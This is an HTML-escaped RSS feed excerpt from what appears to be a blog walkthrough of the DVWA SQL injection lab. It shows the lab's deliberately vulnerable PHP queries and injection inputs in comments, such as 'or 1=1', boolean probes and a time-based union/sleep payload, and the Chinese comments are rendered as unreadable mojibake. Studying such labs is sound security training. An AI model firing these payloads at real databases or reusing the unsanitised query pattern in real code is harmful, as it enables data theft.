    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 1;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ²¡æœ‰æ–°èŠ±æ ·ï¼Œåªé™åˆ¶è¾“å‡ºæ¡ç›®æ˜¯æ— æ³•æ‹¦ä½æˆ‘ä»¬çš„
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å°è¯•æ„é€ :
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Get values
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;First name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;Surname: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Increase loop count
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;mysql_close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;high-1&#34;&gt;High&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Check Anti-CSRF token
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;checkToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;user_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;session_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Was a number entered?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Check the database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// PDO æ— æ³•æ³¨å…¥
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prepare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bindParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;:id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;PARAM_INT&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rowCount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// User wasn&amp;#39;t found, so the page wasn&amp;#39;t!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39; 404 Not Found&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

            &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// Generate Anti-CSRF token
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;generateSessionToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>SQL Injection</title>
        <link>https://sdttttt.github.io/p/sql-injection/</link>
        <pubDate>Fri, 10 Apr 2020 10:54:47 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sql-injection/</guid>
        <description>&lt;p&gt;DVWA SQL Injection è¿‡å…³ç§˜ç±.&lt;/p&gt;
&lt;h3 id=&#34;low&#34;&gt;LOW&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// å¹¶æ²¡æœ‰åšä»€ä¹ˆæ³¨å…¥é˜²æŠ¤
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å°è¯•æ„é€ ï¼š
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; and 1=1;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; and 1=2;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; or 1=1;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Get values
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;First name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;Surname: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Increase loop count
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;mysql_close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;medium&#34;&gt;Medium&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ¢æˆäº†Post è¿™ä¹Ÿå¤ªæ™®é€šäº†
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ä½¿ç”¨ä¸€äº›ç½‘ç»œè¯·æ±‚å·¥å…·ç…§æ ·æ”¹ï¼Œæ¯”å¦‚BurpSuiteï¼ŒPostManï¼Œcurl.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// mysql_real_escape_string å¯ä»¥å¯¹ä»¥ä¸‹å­—ç¬¦è¿›è¡Œè½¬ä¹‰
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// \x00, \n, \r, \, &amp;#39;, &amp;#34; å’Œ \x1a.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å€¼å¾—æ³¨æ„çš„æ˜¯ mysql_real_escape_string å‡½æ•°æ‰€åœ¨çš„MYSQLæ‰©å±•åœ¨
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// PHP 5.5.0 èµ·å·²åºŸå¼ƒï¼Œå¹¶åœ¨è‡ª PHP 7.0.0 å¼€å§‹è¢«ç§»é™¤ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// å°è¯•æ„é€ :
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = 1 or 1=1;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
